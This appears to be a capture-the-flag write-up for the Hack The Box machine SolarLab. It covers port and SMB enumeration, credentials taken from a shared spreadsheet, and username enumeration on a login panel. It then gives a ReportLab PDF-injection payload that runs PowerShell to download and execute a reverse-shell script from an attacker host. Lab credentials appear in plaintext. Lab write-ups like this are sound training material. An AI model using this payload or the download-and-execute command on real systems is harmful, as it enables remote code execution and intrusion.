**Ping**
![[Pasted image 20240710092956.png]]

**Nmap Scans**
```
mapit 10.10.11.16
```

Nmap Default Scan
![[Pasted image 20240710093053.png]]

Nmap Service and Script Scan
![[Pasted image 20240710093136.png]]

Nmap All Port Scan
![[Pasted image 20240710093838.png]]

Nmap Service and Script Scan for New Port
![[Pasted image 20240710094009.png]]

Updated my hosts file
![[Pasted image 20240710095125.png]]

On Port 80 http://solarlab.htb
![[Pasted image 20240710103417.png]]

On Port 6791 http://report.solarlab.htb:6791
![[Pasted image 20240710103452.png]]

There an issue in this this login panel, it say's "user not found" when we give wrong username's
![[Pasted image 20240710103655.png]]

Gobuster Scan
```
gobuster dir -u http://solarlab.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240710101416.png]]

Smb Enumeration
```
smbclient -U '' -L \\\\10.10.11.16\\\\
```
![[Pasted image 20240710102325.png]]

Enumerate Share Documents
```
smbclient -N //10.10.11.16/Documents
```
![[Pasted image 20240710102455.png]]
![[Pasted image 20240710102732.png]]

Transferred 4 files from the share, will analyse that
![[Pasted image 20240710103205.png]]

Content of details-file.xlsx
![[Pasted image 20240710103046.png]]
We some juicy info here...!

Tested username against the login panel and find a valid Username
![[Pasted image 20240710103747.png]]
![[Pasted image 20240710104337.png]]
We can see different error message for two Usernames, so this should be a valid usernames

After trying all available password combinations nothing works......:(

But I can See the pattern here, those two users are displayed in the solarlab.htb here we just missing blake the developer, according to the pattern it is their first name and second name as initial(uppercase), so will check **blakeB**
![[Pasted image 20240710104742.png]]

This worked...!
![[Pasted image 20240710104819.png]]


Now will use his password from the xlsx file **blakeB:ThisCanB3typedeasily1@**
![[Pasted image 20240710104943.png]]
Cool, we can see the dashboard...!

Leave Request seems vulnerable
![[Pasted image 20240710111719.png]]
Initially I just uploaded a random picture and generated the pdf

Then I got a PDF
![[Pasted image 20240710111921.png]]




Downloaded and analysed the pdf with exiftool
```
exiftool ouput.pdf
```
![[Pasted image 20240710105802.png]]

We can see reportlab.com, I have seen this before while searching exploits for reporthub login panel 
![[Pasted image 20240710105918.png]]
After understanding the exploit, will now get a shell, now we have to add an extra line in request for pdf generation using burp
```
<para>
    <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell.exe -c iex (iwr -UseBasicParsing http://10.10.14.6/rev.ps1') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
```
![[Pasted image 20240710114752.png]]
Then forward it, at the same time I have started my nc listener

Got shell as blake
![[Pasted image 20240710115013.png]]
![[Pasted image 20240710114955.png]]

**User.txt**
![[Pasted image 20240710115144.png]]


Got creds for other two users
![[Pasted image 20240710120415.png]]
**alexanderk:HotP!fireguard**  
**claudias:007poiuytrewq**

But I can't user this password any where

I can see Openfire user 
![[Pasted image 20240710120724.png]]

Will check program files
![[Pasted image 20240710120806.png]]
We have openfire and unknown program

Due to some technical difficulty, I can't be able to continue this box
But after sometime it worked and found admin cred and used Impacket-psexec to get a shell as admin and got root.txt
![[Pasted image 20240710123223.png]]
**Administrator:ThisPasswordShouldDo!@**

**Root.txt**
![[Pasted image 20240710123323.png]]



Done with SolarLab......:)